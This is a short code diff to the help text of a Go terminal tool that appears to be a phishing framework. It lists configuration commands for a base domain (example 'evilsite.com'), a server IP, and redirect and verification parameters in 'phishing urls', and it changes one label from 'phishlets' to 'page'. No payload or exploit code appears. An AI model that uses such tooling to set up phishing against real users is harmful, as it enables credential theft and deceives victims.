@@ -965,7 +965,7 @@ func (t *Terminal) createHelp() {
 	h.AddCommand("config", "general", "manage general configuration", "Shows values of all configuration variables and allows to change them.", LAYER_TOP,
 		readline.PcItem("config", readline.PcItem("domain"), readline.PcItem("ip"), readline.PcItem("redirect_key"), readline.PcItem("verification_key"), readline.PcItem("verification_token"), readline.PcItem("redirect_url")))
 	h.AddSubCommand("config", nil, "", "show all configuration variables")
-	h.AddSubCommand("config", []string{"domain"}, "domain <domain>", "set base domain for all phishlets (e.g. evilsite.com)")
+	h.AddSubCommand("config", []string{"domain"}, "domain <domain>", "set base domain for all page (e.g. evilsite.com)")
 	h.AddSubCommand("config", []string{"ip"}, "ip <ip_address>", "set ip address of the current server")
 	h.AddSubCommand("config", []string{"redirect_key"}, "redirect_key <name>", "change name of the redirect parameter in phishing url (phishing urls will need to be regenerated)")
 	h.AddSubCommand("config", []string{"verification_key"}, "verification_key <name>", "change name of the verification parameter in phishing url (phishing urls will need to be regenerated)")
